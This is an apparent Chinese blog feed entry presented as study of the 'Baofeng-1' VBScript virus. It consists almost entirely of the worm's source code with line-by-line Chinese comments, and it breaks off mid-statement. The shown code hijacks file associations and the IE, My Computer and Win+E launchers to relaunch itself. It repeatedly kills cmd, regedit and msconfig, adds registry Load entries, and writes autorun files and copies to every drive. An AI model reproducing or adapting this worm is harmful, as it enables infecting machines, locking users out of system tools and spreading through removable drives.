        <content type="html"><![CDATA[<p>暴风一号 病毒 源码学习，vbs源码</p><a id="more"></a><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span> <span class="comment">'//屏蔽出错信息，发生错误时继续向下执行</span></span><br><span class="line"><span class="keyword">Dim</span> Fso,WshShell <span class="comment">'//定义了两个变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//创建并返回对 Automation 对象的引用。</span></span><br><span class="line"><span class="comment">'//CreateObject(servername.typename [, location])</span></span><br><span class="line"><span class="comment">'//servername 必选项。提供对象的应用程序名称。</span></span><br><span class="line"><span class="comment">'//typename 必选项。要创建的对象类型或类。</span></span><br><span class="line"><span class="comment">'//location 可选项。对象所在的网络服务器将被创建。</span></span><br><span class="line"><span class="comment">'//说明Automation 服务器至少提供一种对象类型。例如，字处理应用程序可以提供应用程序对象、文档对象和工具条对象。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> Fso=<span class="built_in">CreateObject</span>(<span class="string">"scRiPTinG.fiLEsysTeMoBjEcT"</span>) <span class="comment">'//为变量Fso赋值 创建 Scripting.FileSystemObject 对象 提供对计算机文件系统的访问</span></span><br><span class="line"><span class="keyword">Set</span> WshShell=<span class="built_in">CreateObject</span>(<span class="string">"wScRipT.SHelL"</span>) <span class="comment">'//为变量WshShell赋值 创建Wscript.Shell对象 用于获取系统环境变量的访问、创建快捷方式、访问Windows的特殊文件夹，</span></span><br><span class="line">                       <span class="comment">'//以及添加或删除注册表条目。还可以使用Shell对象的功能创建更多的定制对话框以进行用户交互。</span></span><br><span class="line"><span class="keyword">Call</span> Main() <span class="comment">'//call 将控制权传递到sub或function</span></span><br><span class="line"><span class="keyword">Sub</span> Main() <span class="comment">'//sub、function 两种表示方法 sub没有返回值，function有返回值</span></span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Args, VirusLoad, VirusAss</span><br><span class="line">    <span class="keyword">Set</span> Args=WScript.Arguments <span class="comment">'//返回wsh对象的参数集</span></span><br><span class="line">    VirusLoad=GetMainVirus(<span class="number">1</span>)  <span class="comment">'//获得System文件夹下smss.exe 蠕虫地址</span></span><br><span class="line">    VirusAss=GetMainVirus(<span class="number">0</span>)   <span class="comment">'//获得Windows文件夹下explorer.exe 蠕虫地址</span></span><br><span class="line">    ArgNum=<span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">Do</span> <span class="keyword">While</span> ArgNum &lt; Args.Count</span><br><span class="line">        Param=Param&amp;<span class="string">" "</span>&amp;Args(ArgNum)</span><br><span class="line">        ArgNum=ArgNum + <span class="number">1</span></span><br><span class="line">    <span class="keyword">Loop</span></span><br><span class="line">    SubParam=<span class="built_in">LCase</span>(<span class="built_in">Right</span>(Param, <span class="number">3</span>)) <span class="comment">'//LCase 返回字符串的小写形式 Right 从字符串右边返回指定数目的字符</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">Select</span> <span class="keyword">Case</span> SubParam <span class="comment">'//select类似switch</span></span><br><span class="line">    <span class="keyword">Case</span> <span class="string">"run"</span> <span class="comment">'//当运行run时，同时启动病毒文件</span></span><br><span class="line">        RunPath=<span class="built_in">Left</span>(WScript.ScriptFullName, <span class="number">2</span>) <span class="comment">'//ScriptFullName属性返回当前正在运行的脚本的完整路径。该属性返回一个只读的字符串。</span></span><br><span class="line">        <span class="keyword">Call</span> Run(RunPath)</span><br><span class="line">        <span class="keyword">Call</span> InvadeSystem(VirusLoad,VirusAss)</span><br><span class="line">        <span class="keyword">Call</span> Run(<span class="string">"%SystemRoot%/system/svchost.exe "</span>&amp;VirusLoad)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">Case</span> <span class="string">"txt"</span>, <span class="string">"log"</span>,<span class="string">"ini"</span> ,<span class="string">"inf"</span> <span class="comment">'//运行"txt", "log", "ini", "inf"后缀名文件时，同时启动病毒文件</span></span><br><span class="line">        RunPath=<span class="string">"%SystemRoot%/system32/NOTEPAD.EXE "</span>&amp;Param</span><br><span class="line">        <span class="keyword">Call</span> Run(RunPath)</span><br><span class="line">        <span class="keyword">Call</span> InvadeSystem(VirusLoad,VirusAss)</span><br><span class="line">        <span class="keyword">Call</span> Run(<span class="string">"%SystemRoot%/system/svchost.exe "</span>&amp;VirusLoad)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">Case</span> <span class="string">"bat"</span>, <span class="string">"cmd"</span> <span class="comment">'//运行"bat", "cmd"批处理或命令提示符时，同时启动病毒文件</span></span><br><span class="line">        RunPath=<span class="string">"CMD /c echo Hi!I'm here!&amp;pause"</span></span><br><span class="line">        <span class="keyword">Call</span> Run(RunPath)</span><br><span class="line">        <span class="keyword">Call</span> InvadeSystem(VirusLoad,VirusAss)</span><br><span class="line">        <span class="keyword">Call</span> Run(<span class="string">"%SystemRoot%/system/svchost.exe "</span>&amp;VirusLoad)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">Case</span> <span class="string">"reg"</span> <span class="comment">'//运行"reg"注册表导入程序时，同时启动病毒文件</span></span><br><span class="line">        RunPath=<span class="string">"regedit.exe "</span>&amp;<span class="string">""""</span>&amp;<span class="built_in">Trim</span>(Param)&amp;<span class="string">""""</span></span><br><span class="line">        <span class="keyword">Call</span> Run(RunPath)</span><br><span class="line">        <span class="keyword">Call</span> InvadeSystem(VirusLoad,VirusAss)</span><br><span class="line">        <span class="keyword">Call</span> Run(<span class="string">"%SystemRoot%/system/svchost.exe "</span>&amp;VirusLoad)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">Case</span> <span class="string">"chm"</span> <span class="comment">'//运行"chm"帮助文件时，同时启动病毒文件</span></span><br><span class="line">        RunPath=<span class="string">"hh.exe "</span>&amp;<span class="string">""""</span>&amp;<span class="built_in">Trim</span>(Param)&amp;<span class="string">""""</span></span><br><span class="line">        <span class="keyword">Call</span> Run(RunPath)</span><br><span class="line">        <span class="keyword">Call</span> InvadeSystem(VirusLoad,VirusAss)</span><br><span class="line">        <span class="keyword">Call</span> Run(<span class="string">"%SystemRoot%/system/svchost.exe "</span>&amp;VirusLoad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Case</span> <span class="string">"hlp"</span> <span class="comment">'//运行"hlp"帮助文件时，同时启动病毒文件</span></span><br><span class="line">        RunPath=<span class="string">"winhlp32.exe "</span>&amp;<span class="string">""""</span>&amp;<span class="built_in">Trim</span>(Param)&amp;<span class="string">""""</span></span><br><span class="line">        <span class="keyword">Call</span> Run(RunPath)</span><br><span class="line">        <span class="keyword">Call</span> InvadeSystem(VirusLoad,VirusAss)</span><br><span class="line">        <span class="keyword">Call</span> Run(<span class="string">"%SystemRoot%/system/svchost.exe "</span>&amp;VirusLoad)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">Case</span> <span class="string">"dir"</span> <span class="comment">'//运行dir命令，同时启动病毒文件</span></span><br><span class="line">        RunPath=<span class="string">""""</span>&amp;<span class="built_in">Left</span>(<span class="built_in">Trim</span>(Param),<span class="built_in">Len</span>(<span class="built_in">Trim</span>(Param))<span class="number">-3</span>)&amp;<span class="string">""""</span></span><br><span class="line">        <span class="keyword">Call</span> Run(RunPath)</span><br><span class="line">        <span class="keyword">Call</span> InvadeSystem(VirusLoad,VirusAss)</span><br><span class="line">        <span class="keyword">Call</span> Run(<span class="string">"%SystemRoot%/system/svchost.exe "</span>&amp;VirusLoad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Case</span> <span class="string">"oie"</span> <span class="comment">'//打开我IE图标，同时启动病毒文件</span></span><br><span class="line">        RunPath=<span class="string">"""%ProgramFiles%/Internet Explorer/IEXPLORE.EXE"""</span></span><br><span class="line">        <span class="keyword">Call</span> Run(RunPath)</span><br><span class="line">        <span class="keyword">Call</span> InvadeSystem(VirusLoad,VirusAss)</span><br><span class="line">        <span class="keyword">Call</span> Run(<span class="string">"%SystemRoot%/system/svchost.exe "</span>&amp;VirusLoad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Case</span> <span class="string">"omc"</span> <span class="comment">'//打开我的电脑图标，同时启动病毒文件</span></span><br><span class="line">        RunPath=<span class="string">"explorer.exe /n,::&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;"</span></span><br><span class="line">        <span class="keyword">Call</span> Run(RunPath)</span><br><span class="line">        <span class="keyword">Call</span> InvadeSystem(VirusLoad,VirusAss)</span><br><span class="line">        <span class="keyword">Call</span> Run(<span class="string">"%SystemRoot%/system/svchost.exe "</span>&amp;VirusLoad)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">Case</span> <span class="string">"emc"</span> <span class="comment">'//劫持Win+E</span></span><br><span class="line">        RunPath=<span class="string">"explorer.exe /n,/e,::&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;"</span></span><br><span class="line">        <span class="keyword">Call</span> Run(RunPath)</span><br><span class="line">        <span class="keyword">Call</span> InvadeSystem(VirusLoad,VirusAss)</span><br><span class="line">        <span class="keyword">Call</span> Run(<span class="string">"%SystemRoot%/system/svchost.exe "</span>&amp;VirusLoad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Case</span> <span class="keyword">Else</span></span><br><span class="line">        <span class="keyword">If</span> PreDblInstance=<span class="literal">True</span> <span class="keyword">Then</span> <span class="comment">'//如果条件满足，退出脚本宿主</span></span><br><span class="line">            WScript.Quit</span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">        Timeout = <span class="built_in">Datediff</span>(<span class="string">"ww"</span>, GetInfectedDate, <span class="built_in">Date</span>) - <span class="number">12</span></span><br><span class="line">        <span class="keyword">If</span> Timeout&gt;<span class="number">0</span> <span class="keyword">And</span> <span class="built_in">Month</span>(<span class="built_in">Date</span>) = <span class="built_in">Day</span>(<span class="built_in">Date</span>) <span class="keyword">Then</span></span><br><span class="line">               <span class="keyword">Call</span> VirusAlert()</span><br><span class="line">               <span class="keyword">Call</span> MakeJoke(<span class="built_in">CInt</span>(<span class="built_in">Month</span>(<span class="built_in">Date</span>)))</span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">        <span class="keyword">Call</span> MonitorSystem()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">Select</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//监视系统 结束taskmgr.exe、regedit.exe、msconfig.exe、cmd.exe</span></span><br><span class="line"><span class="keyword">Sub</span> MonitorSystem()</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> ProcessNames, ExeFullNames</span><br><span class="line">    ProcessNames=<span class="built_in">Array</span>(<span class="string">"cmd.exe"</span>,<span class="string">"cmd.com"</span>,<span class="string">"regedit.exe"</span>,<span class="string">"regedit.scr"</span>,<span class="string">"regedit.pif"</span>,<span class="string">"regedit.com"</span>,<span class="string">"msconfig.exe"</span>)</span><br><span class="line">    VBSFullNames=<span class="built_in">Array</span>(GetMainVirus(<span class="number">1</span>)) <span class="comment">'//变量赋值</span></span><br><span class="line">    <span class="keyword">Do</span></span><br><span class="line">        <span class="keyword">Call</span> KillProcess(ProcessNames) <span class="comment">'//如发现变量中的进程，调用结束进程函数</span></span><br><span class="line">        <span class="keyword">Call</span> InvadeSystem(GetMainVirus(<span class="number">1</span>),GetMainVirus(<span class="number">0</span>)) <span class="comment">'// smss.exe 蠕虫地址 explorer.exe 蠕虫地址</span></span><br><span class="line">        <span class="keyword">Call</span> KeepProcess(VBSFullNames) <span class="comment">'//保持病毒进程</span></span><br><span class="line">        WScript.Sleep <span class="number">3000</span> <span class="comment">'//脚本宿主等待时间为3000毫秒=3秒</span></span><br><span class="line">    <span class="keyword">Loop</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//侵入系统</span></span><br><span class="line"><span class="keyword">Sub</span> InvadeSystem(VirusLoadPath,VirusAssPath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Load_Value, File_Value, IE_Value, MyCpt_Value1, MyCpt_Value2, HCULoad, HCUVer, VirusCode, Version</span><br><span class="line">    Load_Value=<span class="string">""""</span>&amp;VirusLoadPath&amp;<span class="string">""""</span> <span class="comment">'//smss.exe的病毒流</span></span><br><span class="line">    File_Value=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;VirusAssPath&amp;<span class="string">""""</span>&amp;<span class="string">" %1 %* "</span> <span class="comment">'// explorer.exe 蠕虫</span></span><br><span class="line">    IE_Value=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;VirusAssPath&amp;<span class="string">""""</span>&amp;<span class="string">" OIE "</span> <span class="comment">'// 打开ie 蠕虫</span></span><br><span class="line">    MyCpt_Value1=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;VirusAssPath&amp;<span class="string">""""</span>&amp;<span class="string">" OMC "</span> <span class="comment">'//打开我的电脑 蠕虫</span></span><br><span class="line">    MyCpt_Value2=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;VirusAssPath&amp;<span class="string">""""</span>&amp;<span class="string">" EMC "</span> <span class="comment">'//劫持Win+E 蠕虫</span></span><br><span class="line">    HCULoad=<span class="string">"HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Load"</span></span><br><span class="line">    HCUVer=<span class="string">"HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Ver"</span></span><br><span class="line">    HCUDate=<span class="string">"HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Date"</span></span><br><span class="line">    VirusCode=GetCode(WScript.ScriptFullName)</span><br><span class="line">    Version=<span class="number">1</span></span><br><span class="line">    HostSourcePath=Fso.GetSpecialFolder(<span class="number">1</span>)&amp;<span class="string">"/Wscript.exe"</span></span><br><span class="line">    HostFilePath=Fso.GetSpecialFolder(<span class="number">0</span>)&amp;<span class="string">"/system/svchost.exe"</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">For</span> <span class="keyword">Each</span> Drive <span class="keyword">In</span> Fso.Drives <span class="comment">'//分别建立各个目录的病毒名字</span></span><br><span class="line">        <span class="keyword">If</span> Drive.IsReady <span class="keyword">and</span> (Drive.DriveType=<span class="number">1</span> <span class="keyword">Or</span> Drive.DriveType=<span class="number">2</span> <span class="keyword">Or</span> Drive.DriveType=<span class="number">3</span>) <span class="keyword">Then</span></span><br><span class="line">            DiskVirusName=GetSerialNumber(Drive.DriveLetter)&amp;<span class="string">".vbs"</span></span><br><span class="line">                <span class="keyword">Call</span> CreateAutoRun(Drive.DriveLetter,DiskVirusName) <span class="comment">'//创建自动运行</span></span><br><span class="line">                <span class="keyword">Call</span> InfectRoot(Drive.DriveLetter,DiskVirusName) <span class="comment">'//感染</span></span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">If</span> FSO.FileExists(VirusAssPath)=<span class="literal">False</span> <span class="keyword">Or</span> FSO.FileExists(VirusLoadPath)=<span class="literal">False</span> <span class="keyword">Or</span> FSO.FileExists(HostFilePath)=<span class="literal">False</span> <span class="keyword">Or</span> GetVersion()&lt; Version <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">If</span> GetFileSystemType(GetSystemDrive())=<span class="string">"NTFS"</span> <span class="keyword">Then</span> <span class="comment">'//判断是否为NTFS分区</span></span><br><span class="line">            <span class="keyword">Call</span> 